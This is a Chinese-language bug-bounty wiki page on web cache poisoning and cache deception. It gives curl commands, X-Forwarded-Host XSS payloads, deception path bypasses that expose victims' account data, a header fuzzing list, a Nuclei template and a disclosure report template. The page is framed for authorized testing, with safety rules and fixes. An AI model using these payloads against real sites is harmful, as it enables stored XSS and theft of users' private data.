---
type: wiki
category: attack
tool: burp,param-miner
status: active
last-updated: 2026-04-21
---

# Web Cache Poisoning & Deception

> **用途：** CDN / Varnish / nginx cache 幾乎每個網站都有。若 cache key 漏掉某個 header/param → 攻擊者可污染，讓全站使用者收到惡意 response。
> James Kettle 2018 研究後成為大獎類別。Reflected XSS 無法打的場景，透過 cache 變 stored → P2-P1。

## 0. 兩類別區分

| | Cache Poisoning | Cache Deception |
|--|---|---|
| 方向 | 攻擊者寫入 cache，害別人 | 害受害者把自己 private response 存到 public cache |
| Impact | Stored XSS / redirect / DoS | Session leak（PII / token）|
| Key 技巧 | Unkeyed header 影響 response | URL path 混淆讓 cache 規則誤判 |

## 1. Cache Poisoning 原理

```
Request 1 (attacker):
  GET /index.html
  Host: target.com
  X-Forwarded-Host: evil.com   ← unkeyed (cache 不算進 key)
  ↓
  Server response: <meta ... href="https://evil.com/...">
  ↓
  Cache saves this response under key "GET /index.html + Host: target.com"

Request 2 (victim):
  GET /index.html
  Host: target.com
  ↓
  Cache hit → 拿到 attacker 污染的 response
  ↓
  Victim browser loads evil.com/x
```

### Cache key 與 unkeyed input

Cache 只用**一部分** request 當 key（通常是 method + path + Host）。**沒進 key 的 input** 若影響 response → 可 poison。

常見 unkeyed：
- `X-Forwarded-Host / X-Host / X-Forwarded-Scheme`
- `X-Forwarded-For / X-Real-IP`
- `User-Agent` 某些 hash 只用一部分
- `X-HTTP-Method-Override`
- Port in Host (`Host: target.com:80` vs `target.com`)
- 大小寫（`Host: TARGET.com`）
- Trailing 空白
- Query string 參數順序 / 重複
- Cookie（通常 keyed，但 subset 可能不算）
- Custom header: `X-Original-URL`, `X-Rewrite-URL`

## 2. 偵測：Param Miner（Burp）

```
1. Burp BApp Store → 裝 "Param Miner"
2. 右鍵 request → "Guess headers"（大字典 header fuzzing）
3. Param Miner 會：
   - 偵測 cache hit/miss 差異
   - Fuzz 1000+ unkeyed header
   - 找 reflected response 中的 payload
4. 看 Issues tab → "Cache poisoning"
```

Param Miner 是這個類別的**決定性工具**，手動幾乎找不到。

## 3. 手動偵測流程

### Step 1: 確認有 cache

```bash
curl -sk -I https://target.com/index.html
# 看 header:
# X-Cache: HIT / MISS
# Age: 123
# CF-Cache-Status: HIT
# X-Served-By: cache-xxx
# Via: varnish
```

### Step 2: 測 X-Forwarded-Host

```bash
# 清 cache（改 path 一次）
curl -sk "https://target.com/index.html?cb=$(date +%s)" -H "X-Forwarded-Host: evil.com"

# 再打同個 URL 看是否 reflect
curl -sk "https://target.com/index.html?cb=$(date +%s)" | grep evil.com

# 若 response 含 <script src="https://evil.com/..."> → confirmed
```

### Step 3: 確認是否 cache 了

```bash
# 用 same cache-buster URL 打第二次
curl -sk "https://target.com/index.html?cb=123" | grep evil.com
# 第一次不用帶 X-Forwarded-Host，看是否仍 reflect
# 若是 → poisoned，cache 進去了
```

## 4. 常見 Gadget 類型

### 4.1 Reflected header in HTML

```html
<!-- HTML has: -->
<link rel="canonical" href="https://<Host>/path"/>

<!-- Attacker: -->
Host: target.com
X-Forwarded-Host: <script>alert(1)</script>

<!-- If X-Forwarded-Host 取代 canonical → stored XSS after cache -->
```

### 4.2 Import asset URL

```javascript
// Application code:
const apiBase = req.headers['x-forwarded-host'] || 'api.target.com';
// response 包含
<script src="//x-forwarded-host/main.js"></script>
```

Attacker 污染 → victim 載入 `evil.com/main.js`。

### 4.3 Redirect to attacker

```http
# Response
HTTP/1.1 302 Found
Location: https://<X-Forwarded-Host>/home
```

Victim 被永久重導到 evil.com。

### 4.4 Port in Host

```
Host: target.com:<script>alert(1)</script>
```

某些 app 把 `$HTTP_HOST` 反射到 HTML → XSS after cache。

### 4.5 DoS 類（low-value，但記錄）

```
GET /index.html
X-Oops: xxx<很大的 payload>

Server 回 400 error page
Cache 存 400 page + key 是普通 /index.html
→ 全站 /index.html 給 victim 看 400
```

多數 program 不收 DoS 類。

## 5. Cache Deception

### 5.1 原理

Cache 規則常是「副檔名 css/js/png/gif/ico 不管 cookie 都 cache」。攻擊者讓 URL 看起來像 static：

```
Victim 點擊連結：
https://target.com/profile/me/nonexistent.css

Server 回 /profile/me 的 response（因為 nginx try_files 或 framework routing）
→ response 含 victim 的 private data (email, session, etc.)
→ Cache 看 URL 有 .css 結尾 → cache 它
→ 任何人訪問同 URL → 拿到 victim 的 private data
```

### 5.2 實作

```bash
# Attacker 告訴 victim 打開
https://target.com/my-account/x.css

# Server 解析：/my-account 是 valid route，忽略 /x.css
# Response: {"email":"victim@x.com","credit_card":"4111...","token":"..."}

# Cache header 視 .css → cached

# Attacker 打開：
curl https://target.com/my-account/x.css
→ 拿到 victim 的 response
```

### 5.3 Bypass patterns

```
/my-account/x.css
/my-account/x.jpg
/my-account/x.ico
/my-account/x%2F.css
/my-account/.css
/my-account?x=1.css
/my-account/..%2F..%2Fstatic%2Fx.css
/my-account;x.css          ← matrix param
```

Omer Gil 原研究測試了 20+ 變體，Cloudflare / Cloudfront / Akamai / Fastly 都有中。

## 6. Keyed / Unkeyed 測試技巧

```bash
# 目標：確認某個 header 是否進 cache key

# 兩個 request 只差一個 header
A:
  GET /path?cb=1  Host: target.com
B:
  GET /path?cb=1  Host: target.com  X-Header: test

如果：
- A 和 B 都 MISS 第一次，第二次都 HIT → X-Header 進 key（或根本不影響）
- A HIT, B MISS → 可能 X-Header 未進 key，但 A 先 cache 了
- 都 MISS，body 不同 → unkeyed + reflected ✅ 可 poison

# Param Miner 自動化這流程
```

## 7. 實戰 PoC: Header Reflection → Stored XSS via Cache

Target：假設首頁有 `<meta property="og:url" content="https://<Host>/">` 反射。

### Step 1: 確認 Host 反射
```bash
curl -sk https://target.com/ -H "Host: XSS.com" | grep "og:url"
# <meta property="og:url" content="https://XSS.com/">
```

### Step 2: 找 unkeyed header 可蓋 Host
```bash
# X-Forwarded-Host:
curl -sk https://target.com/ -H "X-Forwarded-Host: evil.com" | grep "og:url"
# → <meta property="og:url" content="https://evil.com/">
```

### Step 3: 確認 cache 吃進去
```bash
CB=$(date +%s)
# 第一次帶 payload（write）
curl -sk "https://target.com/?cb=$CB" \
  -H "X-Forwarded-Host: x.evil.com/\"><script>alert(1)</script><x y=\""

# 第二次乾淨請求（read）
curl -sk "https://target.com/?cb=$CB" | grep script
# 若看到 <script>alert(1)</script> → 成功 poison
```

### Step 4: 找 DoS-safe 的 path 做實驗
- ❌ 不要 poison `/` 或 `/js/app.js`（害所有人）
- ✅ 用自訂 `?cb=uuid` 或不常見 path

### Step 5: 報告 + 要求 cache purge

## 8. 實戰 PoC: Cache Deception → Session Steal

Target：React SPA，`/account` 回 JSON PII

### Step 1: 看 cache 規則
```bash
curl -sk -I https://target.com/static/app.js
# → Cache-Control: public, max-age=3600
curl -sk -I https://target.com/account -H "Authorization: Bearer $TOKEN"
# → Cache-Control: no-store（正常）

# 測 deception
curl -sk https://target.com/account/x.css -H "Authorization: Bearer $TOKEN"
# 若回 /account 的 response → 雖然 Cache-Control 可能仍是 no-store
# 但 CDN 有時無視（看 extension 就 cache）
```

### Step 2: 確認 cache hit（另一 session）
```bash
curl -sk https://target.com/account/x.css    # 無 auth
# 若回你的 JSON data → 成功 → P1 session leak
```

## 9. 安全測試守則

1. ⚠️ **Cache 污染是 globally stored** — 所有 victim 看到
2. ✅ 使用 `?cb=random-uuid` 隔離測試 cache entry
3. ❌ 不要 poison index, main.js 等核心 asset
4. ❌ 不要 poison high-traffic page
5. ✅ 測完立即聯絡 program → cache purge
6. ✅ 報告附 poisoned URL 與 cache purge 建議
7. ⚠️ DoS-only poisoning 多數 program out-of-scope

## 10. 報告 template

```markdown
## 漏洞概述
https://target.com/ 的 Cloudflare cache 未將 `X-Forwarded-Host` 加入 cache key，
此 header 被反射在 `<meta property="og:url">` 中未轉義，攻擊者可 poison cache 導致
所有後續訪問此 URL 的使用者執行任意 JavaScript（stored XSS）。

## 重現步驟

### Step 1: 確認反射
curl -sk "https://target.com/?cb=$(date +%s)" \
  -H "X-Forwarded-Host: poc.example.com" | grep og:url
→ <meta property="og:url" content="https://poc.example.com/"/>

### Step 2: Payload 注入
CB=rpoc-2026-04-21
curl -sk "https://target.com/?cb=$CB" \
  -H 'X-Forwarded-Host: x"><script>alert(document.domain)</script><x y="'

### Step 3: 驗證 cache 持久化
curl -sk "https://target.com/?cb=$CB" | grep alert
→ <meta property="og:url" content="https://x"><script>alert(document.domain)</script>

### Step 4: 另一 IP / browser 訪問同 URL
→ 瀏覽器彈 alert (same origin)

## Impact
- Stored XSS（any visitor 至 poisoned URL → JS 執行）
- 可竊取 authenticated user 的 cookie / localStorage
- 因 Cloudflare TTL 為 3600s → 污染可持續 1 小時

## 修補建議
1. Cache-Control 排除 X-Forwarded-Host 影響，或
2. 將 X-Forwarded-Host 加入 Vary header / cache key，或
3. 最根本：server 端對 meta og:url 做 HTML escape

## Cache purge（急）
請立即對 URL `https://target.com/?cb=rpoc-2026-04-21` 做 purge。

## Severity
P1 / Critical
```

## 11. Nuclei template

```yaml
id: cache-poisoning-xfh
info:
  name: X-Forwarded-Host Cache Poisoning probe
  severity: info

http:
  - raw:
      - |
        GET /?{{randstr}} HTTP/1.1
        Host: {{Hostname}}
        X-Forwarded-Host: {{interactsh-url}}

    matchers:
      - type: dsl
        dsl:
          - contains(body, "{{interactsh-url}}")
```

實際上 nuclei 不太適合測 cache poison，要測 second request 的 response diff。手動 / Param Miner 最可靠。

## 12. 常用 header fuzzing list

```
X-Forwarded-Host
X-Forwarded-Server
X-Forwarded-Scheme
X-Forwarded-Proto
X-Forwarded-For
X-Forwarded-Port
X-Host
X-Real-IP
X-Original-URL
X-Rewrite-URL
X-Override-URL
X-HTTP-Method-Override
X-HTTP-Host-Override
X-Backend
X-Original-Host
Forwarded
True-Client-IP
CF-Connecting-IP
Fastly-Client-IP
Via
Referer
User-Agent
Accept-Language
Accept-Encoding
Pragma
```

## 關聯文件

- [01-waf-bypass-playbook.md](01-waf-bypass-playbook.md) — CDN 背後攻擊
- [14-waf-bypass-commands.md](14-waf-bypass-commands.md) — header 繞過技巧
- [60-request-smuggling.md](60-request-smuggling.md) — smuggling 的常見 impact
- PortSwigger Cache Poisoning Research：https://portswigger.net/research/practical-web-cache-poisoning
- PortSwigger Cache Deception Lab：https://portswigger.net/web-security/web-cache-deception
- Omer Gil 原 paper：https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html
- Param Miner：https://github.com/PortSwigger/param-miner
